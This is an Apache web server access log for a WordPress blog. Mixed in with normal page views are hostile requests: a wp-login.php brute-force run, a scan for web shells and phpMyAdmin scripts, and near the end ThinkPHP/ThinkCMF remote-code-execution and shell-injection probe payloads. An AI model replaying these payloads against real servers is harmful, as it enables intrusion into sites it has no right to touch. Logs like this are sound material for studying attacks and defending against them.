127.0.0.1 - - [16/Feb/2020:13:04:29 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
85.206.165.18 - - [16/Feb/2020:13:16:30 -0700] "GET /blog/2018/01/02/happy-new-year/ HTTP/1.0" 301 - "http://datostech.com/blog/2018/01/02/happy-new-year/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
85.206.165.18 - - [16/Feb/2020:13:16:31 -0700] "GET /2018/01/02/happy-new-year/ HTTP/1.0" 200 26138 "http://datostech.com/2018/01/02/happy-new-year/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
85.206.165.18 - - [16/Feb/2020:13:16:32 -0700] "GET /blog/ HTTP/1.0" 200 23646 "http://datostech.com/blog/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
127.0.0.1 - - [16/Feb/2020:13:22:15 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
127.0.0.1 - - [16/Feb/2020:13:22:16 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
189.89.216.29 - - [16/Feb/2020:13:22:50 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
189.89.216.29 - - [16/Feb/2020:13:22:51 -0700] "POST /wp-login.php HTTP/1.1" 200 7334 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
189.89.216.29 - - [16/Feb/2020:13:22:52 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
189.89.216.29 - - [16/Feb/2020:13:22:54 -0700] "POST /wp-login.php HTTP/1.1" 200 8013 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
189.89.216.29 - - [16/Feb/2020:13:22:55 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
189.89.216.29 - - [16/Feb/2020:13:23:00 -0700] "POST /wp-login.php HTTP/1.1" 200 8011 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
189.89.216.29 - - [16/Feb/2020:13:23:04 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
189.89.216.29 - - [16/Feb/2020:13:23:05 -0700] "POST /wp-login.php HTTP/1.1" 200 8017 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
189.89.216.29 - - [16/Feb/2020:13:23:07 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
189.89.216.29 - - [16/Feb/2020:13:23:07 -0700] "POST /wp-login.php HTTP/1.1" 200 8012 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
189.89.216.29 - - [16/Feb/2020:13:23:09 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
189.89.216.29 - - [16/Feb/2020:13:23:11 -0700] "POST /wp-login.php HTTP/1.1" 200 8026 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
189.89.216.29 - - [16/Feb/2020:13:23:12 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
189.89.216.29 - - [16/Feb/2020:13:23:15 -0700] "POST /wp-login.php HTTP/1.1" 200 8013 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
189.89.216.29 - - [16/Feb/2020:13:23:16 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
189.89.216.29 - - [16/Feb/2020:13:23:17 -0700] "POST /wp-login.php HTTP/1.1" 200 8025 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
189.89.216.29 - - [16/Feb/2020:13:23:19 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
189.89.216.29 - - [16/Feb/2020:13:23:20 -0700] "POST /wp-login.php HTTP/1.1" 200 8025 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
189.89.216.29 - - [16/Feb/2020:13:23:21 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
189.89.216.29 - - [16/Feb/2020:13:23:22 -0700] "POST /wp-login.php HTTP/1.1" 200 8009 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
159.203.81.46 - - [16/Feb/2020:13:43:37 -0700] "GET /2019/wp-signup.php HTTP/1.1" 404 17752 "datostech.com" "Mozilla/5.1 (Windows NT 6.0; WOW64) AppleWebKit/537.37 (KHTML, like Gecko) Chrome/58.0.1145.75 Safari/537.37"
159.203.81.46 - - [16/Feb/2020:13:43:49 -0700] "GET /2019/register/ HTTP/1.1" 404 17752 "datostech.com" "Mozilla/5.1 (Windows NT 6.0; WOW64) AppleWebKit/537.37 (KHTML, like Gecko) Chrome/58.0.1145.75 Safari/537.37"
162.243.126.96 - - [16/Feb/2020:14:03:43 -0700] "GET /cms/wp-signup.php HTTP/1.1" 404 17752 "datostech.com" "Mozilla/5.1 (Windows NT 6.0; WOW64) AppleWebKit/537.37 (KHTML, like Gecko) Chrome/58.0.1145.75 Safari/537.37"
162.243.126.96 - - [16/Feb/2020:14:04:14 -0700] "GET /cms/register/ HTTP/1.1" 404 17752 "datostech.com" "Mozilla/5.1 (Windows NT 6.0; WOW64) AppleWebKit/537.37 (KHTML, like Gecko) Chrome/58.0.1145.75 Safari/537.37"
95.168.229.43 - - [16/Feb/2020:14:11:11 -0700] "GET / HTTP/1.1" 400 332 "-" "-"
45.152.6.58 - - [16/Feb/2020:14:14:58 -0700] "HEAD /robots.txt HTTP/1.0" 200 - "-" "-"
104.238.117.191 - - [16/Feb/2020:14:20:39 -0700] "POST /wp-cron.php?doing_wp_cron=1581888039.9822258949279785156250 HTTP/1.1" 200 - "http://datostech.com/wp-cron.php?doing_wp_cron=1581888039.9822258949279785156250" "WordPress/5.3.2; http://datostech.com"
46.188.98.10 - - [16/Feb/2020:14:20:39 -0700] "GET /blog/2018/01/02/happy-new-year/ HTTP/1.0" 301 - "http://datostech.com/blog/2018/01/02/happy-new-year/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
46.188.98.10 - - [16/Feb/2020:14:20:40 -0700] "GET /2018/01/02/happy-new-year/ HTTP/1.0" 200 26138 "http://datostech.com/2018/01/02/happy-new-year/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
46.188.98.10 - - [16/Feb/2020:14:20:41 -0700] "GET /blog/ HTTP/1.0" 200 23646 "http://datostech.com/blog/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
51.255.43.81 - - [16/Feb/2020:14:21:22 -0700] "GET /1/register/ HTTP/1.1" 404 17752 "datostech.com" "Mozilla/5.1 (Windows NT 6.0; WOW64) AppleWebKit/537.37 (KHTML, like Gecko) Chrome/58.0.1145.75 Safari/537.37"
51.255.43.81 - - [16/Feb/2020:14:23:18 -0700] "GET /1/wp-signup.php HTTP/1.1" 404 17752 "datostech.com" "Mozilla/5.1 (Windows NT 6.0; WOW64) AppleWebKit/537.37 (KHTML, like Gecko) Chrome/58.0.1145.75 Safari/537.37"
127.0.0.1 - - [16/Feb/2020:14:29:40 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
103.119.66.53 - - [16/Feb/2020:14:30:16 -0700] "GET / HTTP/1.0" 200 26732 "http://datostech.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36 OPR/54.0.2952.64"
103.119.66.53 - - [16/Feb/2020:14:30:17 -0700] "GET /blog/ HTTP/1.0" 200 23646 "http://datostech.com/blog/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36 OPR/54.0.2952.64"
1.53.86.115 - - [16/Feb/2020:15:20:10 -0700] "GET /index.php?s=/index/ hink" 400 332 "-" "-"
82.241.92.158 - - [16/Feb/2020:15:26:55 -0700] "GET / HTTP/1.1" 400 332 "-" "-"
127.0.0.1 - - [16/Feb/2020:15:36:20 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
104.238.117.191 - - [16/Feb/2020:15:41:32 -0700] "POST /wp-cron.php?doing_wp_cron=1581892892.6197569370269775390625 HTTP/1.1" 200 - "http://datostech.com/wp-cron.php?doing_wp_cron=1581892892.6197569370269775390625" "WordPress/5.3.2; http://datostech.com"
78.47.38.105 - - [16/Feb/2020:15:41:32 -0700] "GET / HTTP/1.1" 200 26732 "-" "Go-http-client/1.1"
78.47.38.105 - - [16/Feb/2020:15:41:33 -0700] "GET / HTTP/1.1" 200 26732 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.59 Safari/537.36"
127.0.0.1 - - [16/Feb/2020:15:41:52 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
127.0.0.1 - - [16/Feb/2020:15:41:53 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
193.106.30.99 - - [16/Feb/2020:15:42:55 -0700] "POST /configuration.php HTTP/1.1" 404 17752 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36"
104.238.117.191 - - [16/Feb/2020:15:50:00 -0700] "POST /wp-cron.php?doing_wp_cron=1581893400.4470939636230468750000 HTTP/1.1" 200 - "http://datostech.com/wp-cron.php?doing_wp_cron=1581893400.4470939636230468750000" "WordPress/5.3.2; http://datostech.com"
95.73.233.147 - - [16/Feb/2020:15:50:00 -0700] "GET /blog/2018/01/02/happy-new-year/ HTTP/1.0" 301 - "http://datostech.com/blog/2018/01/02/happy-new-year/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
95.73.233.147 - - [16/Feb/2020:15:50:01 -0700] "GET /2018/01/02/happy-new-year/ HTTP/1.0" 200 26138 "http://datostech.com/2018/01/02/happy-new-year/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
95.73.233.147 - - [16/Feb/2020:15:50:02 -0700] "GET /blog/ HTTP/1.0" 200 23646 "http://datostech.com/blog/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
106.54.4.180 - - [16/Feb/2020:15:52:54 -0700] "GET / HTTP/1.1" 301 - "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
106.54.4.180 - - [16/Feb/2020:15:52:56 -0700] "GET /robots.txt HTTP/1.1" 200 26 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
106.54.4.180 - - [16/Feb/2020:15:52:56 -0700] "POST /Adminbf75ee68/Login.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
106.54.4.180 - - [16/Feb/2020:15:52:57 -0700] "GET / HTTP/1.1" 301 - "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
106.54.4.180 - - [16/Feb/2020:15:52:58 -0700] "GET /l.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
106.54.4.180 - - [16/Feb/2020:15:53:00 -0700] "GET /phpinfo.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
106.54.4.180 - - [16/Feb/2020:15:53:01 -0700] "GET /test.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0"
106.54.4.180 - - [16/Feb/2020:15:53:02 -0700] "POST /index.php HTTP/1.1" 200 26783 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0"
106.54.4.180 - - [16/Feb/2020:15:53:04 -0700] "POST /bbs.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0"
106.54.4.180 - - [16/Feb/2020:15:53:05 -0700] "POST /forum.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0"
106.54.4.180 - - [16/Feb/2020:15:53:06 -0700] "POST /forums.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0"
106.54.4.180 - - [16/Feb/2020:15:53:08 -0700] "POST /bbs/index.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0"
106.54.4.180 - - [16/Feb/2020:15:53:09 -0700] "POST /forum/index.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0"
106.54.4.180 - - [16/Feb/2020:15:53:12 -0700] "GET /webdav/ HTTP/1.1" 301 - "-" "Mozilla/5.0"
106.54.4.180 - - [16/Feb/2020:15:53:13 -0700] "GET /help.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:14 -0700] "GET /java.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:16 -0700] "GET /test.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:17 -0700] "GET /db_cts.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:17 -0700] "GET /db_pma.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:20 -0700] "GET /help-e.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:21 -0700] "GET /license.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:24 -0700] "GET /hell.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:25 -0700] "GET /pmd_online.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:26 -0700] "GET /x.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:28 -0700] "GET /htdocs.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:29 -0700] "GET /b.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:29 -0700] "GET /sane.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:32 -0700] "GET /z.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:33 -0700] "GET /lala.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:33 -0700] "GET /lala-dpr.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:36 -0700] "GET /wpo.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:37 -0700] "GET /t6nv.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:40 -0700] "GET /text.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:41 -0700] "GET /wp-config.php HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:41 -0700] "GET /muhstik.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:42 -0700] "GET /muhstik2.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:44 -0700] "GET /muhstiks.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:45 -0700] "GET /muhstik-dpr.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:45 -0700] "GET /lol.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:46 -0700] "GET /uploader.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:48 -0700] "GET /cmd.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:49 -0700] "GET /cmv.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:50 -0700] "GET /cmdd.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:52 -0700] "GET /knal.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:53 -0700] "GET /cmd.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:54 -0700] "GET /shell.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:56 -0700] "GET /scripts/setup.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:57 -0700] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:58 -0700] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:53:58 -0700] "GET /scripts/db___.init.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:00 -0700] "GET /phpmyadmin/scripts/db___.init.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:01 -0700] "GET /phpMyAdmin/scripts/db___.init.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:02 -0700] "GET /pma/scripts/setup.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:02 -0700] "GET /PMA/scripts/setup.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:04 -0700] "GET /myadmin/scripts/setup.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:05 -0700] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:06 -0700] "GET /pma/scripts/db___.init.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:08 -0700] "GET /PMA/scripts/db___.init.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:09 -0700] "GET /myadmin/scripts/db___.init.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:11 -0700] "GET /MyAdmin/scripts/db___.init.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:12 -0700] "GET /plugins/weathermap/editor.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:13 -0700] "GET /cacti/plugins/weathermap/editor.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:14 -0700] "GET /weathermap/editor.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:16 -0700] "GET /index.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50%48%50 HTTP/1.1" 200 18002 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:17 -0700] "GET /elrekt.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50%48%50 HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:18 -0700] "GET /App/?content=die(md5(HelloThinkPHP)) HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:20 -0700] "GET /index.php?s=/module/action/param1/${@die(md5(HelloThinkPHP))} HTTP/1.1" 200 18065 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:21 -0700] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 26783 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:22 -0700] "GET / HTTP/1.1" 301 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:24 -0700] "GET /joomla/ HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:25 -0700] "GET /Joomla/ HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:26 -0700] "GET /?a=echo%20-n%20HelloNginx%7Cmd5sum HTTP/1.1" 301 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:28 -0700] "GET /d7.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
106.54.4.180 - - [16/Feb/2020:15:54:29 -0700] "GET /rxr.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
